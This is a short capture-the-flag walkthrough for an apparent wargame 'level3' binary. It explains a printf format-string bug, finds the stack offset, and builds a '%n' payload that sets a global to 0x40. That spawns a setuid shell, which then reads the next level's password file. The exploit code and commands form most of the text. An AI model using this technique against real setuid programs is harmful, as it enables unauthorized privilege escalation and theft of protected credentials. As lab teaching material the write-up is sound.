level3 - walkthrough
====================

Target: /home/user/level3/level3   (setuid + setgid level4)
Goal:   read /home/user/level4/.pass

1. The bug
   v() does printf(buf) on our input with no format argument -- a format-string
   vulnerability. Then:
     if (m == 0x40) system("/bin/sh");
   `m` is a 4-byte global at 0x0804988c. With %n we can write the number of
   characters printed so far to an address we place on the stack -> make m 0x40.

2. Find our argument position
     $ python -c 'print "AAAA" + ".%x"*12' | ./level3
   0x41414141 shows up as the 4th value, so our input begins at printf argument
   position 4. `%4$n` writes to the 4 bytes at the very start of our input.

3. Payload  (Ressources/exploit.py)
     payload = p32(0x804988c) + b"%60x" + b"%4$n"
   The 4 address bytes print as 4 characters, %60x prints 60 more -> 64 = 0x40
   total, and %4$n writes 0x40 into m. m == 0x40 makes v() spawn the shell.

4. Run
     $ python3 Ressources/exploit.py
     $ (cat payload; printf '\n'; sleep 1; echo 'cat /home/user/level4/.pass') | ./level3
   The 1s pause keeps fgets' read-ahead from eating the command, leaving it in
   the pipe for system("/bin/sh"). (Interactive: replace the echo with `cat`.)

